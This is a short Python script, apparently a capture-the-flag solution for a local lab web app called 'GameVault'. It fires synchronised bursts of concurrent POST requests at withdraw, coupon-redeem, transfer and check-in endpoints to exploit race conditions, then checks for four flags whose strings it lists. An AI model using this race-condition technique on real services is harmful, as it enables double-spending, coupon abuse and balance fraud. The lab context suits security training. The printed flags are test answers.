"""GameVault 收尾脚本 - 一次性把 4 个 FLAG 全部点亮（不中途重置）"""
import threading
import requests
import time

BASE = "http://127.0.0.1:5025"

def concurrent_post(path, data=None, n=12):
    """同时启动 n 个线程发 POST 请求，制造竞争"""
    results = []
    barrier = threading.Barrier(n)

    def worker():
        barrier.wait()
        try:
            r = requests.post(f"{BASE}{path}", data=data or {}, allow_redirects=False, timeout=5)
            results.append(r.status_code)
        except Exception as e:
            results.append(str(e))

    threads = [threading.Thread(target=worker) for _ in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return results


def get_flags():
    r = requests.get(BASE)
    return [f for f in [
        'FLAG{race_withdraw_overspend_2026}',
        'FLAG{race_coupon_reuse_2026}',
        'FLAG{race_transfer_lost_update_2026}',
        'FLAG{race_checkin_multi_2026}',
    ] if f in r.text]


print("重置账号...")
requests.get(f"{BASE}/reset")
time.sleep(0.5)

print("[FLAG1] 提现竞争...")
concurrent_post("/withdraw", {"amount": "100"}, n=12)
time.sleep(0.3)

print("[FLAG2] 优惠券竞争...")
concurrent_post("/redeem", {"code": "GAME100"}, n=12)
time.sleep(0.3)

print("[FLAG3] 转账竞争(Lost Update)...")
concurrent_post("/transfer", n=12)
time.sleep(0.3)

print("[FLAG4] 签到竞争...")
concurrent_post("/checkin", n=12)
time.sleep(0.3)

print()
print("当前 FLAG 收集:", get_flags())
print("打开 http://127.0.0.1:5025 查看完整结果")
